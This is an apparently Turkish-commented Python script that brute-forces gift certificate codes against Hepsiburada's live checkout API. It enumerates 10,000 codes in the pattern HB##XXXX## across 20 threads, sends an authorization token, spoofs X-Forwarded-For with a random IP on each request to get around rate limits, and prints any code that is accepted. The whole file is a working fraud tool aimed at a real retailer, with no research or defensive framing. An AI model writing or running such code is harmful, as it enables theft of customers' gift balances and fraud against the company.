

def random_ip():
    return ".".join(str(random.randint(0, 255)) for _ in range(4))

token = ""  # Bearer ile birlikte token buraya

url = "https://obiwan-gw.hepsiburada.com/api/v1/giftcert/useGiftCert"

def make_headers():
    return {
        'User-Agent': "Mozilla/5.0 (iPhone; CPU iPhone OS 18_0_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
        'Accept': "application/json, text/plain, */*",
        'Accept-Language': "tr-TR,tr;q=0.9",
        'Authorization': token,
        'Origin': "https://checkout.hepsiburada.com",
        'Sec-Fetch-Mode': "cors",
        'Sec-Fetch-Dest': "empty",
        'Referer': "https://checkout.hepsiburada.com/",
        'Sec-Fetch-Site': "same-site",
        'Content-Type': "application/json;charset=utf-8",
        'X-Forwarded-For': random_ip()
    }

q = queue.Queue()

# Kuponları kuyruğa ekle
for i in range(100):
    for j in range(100):
        q.put(f"HB{i:02d}XXXX{j:02d}")

def worker():
    while not q.empty():
        code = q.get()
        payload = {"code": code}
        try:
            headers = make_headers()
            response = requests.post(url, data=json.dumps(payload), headers=headers, timeout=2)
            if response.status_code == 200:
                print(f"\n\033[92m[+] {code} -> {response.text}\033[0m")
            else:
                print(f"\033[91m[-] {code}\033[0m", end=" ", flush=True)
        except Exception as e:
            print(f"\n\033[91m[!] {code} -> Hata: {e}\033[0m")
        q.task_done()

# Thread'leri başlat
threads = []
thread_count = 20  # Kaç thread çalışsın
for _ in range(thread_count):
    t = threading.Thread(target=worker)
    t.start()
    threads.append(t)

# Tüm threadlerin bitmesini bekle
for t in threads:
    t.join()
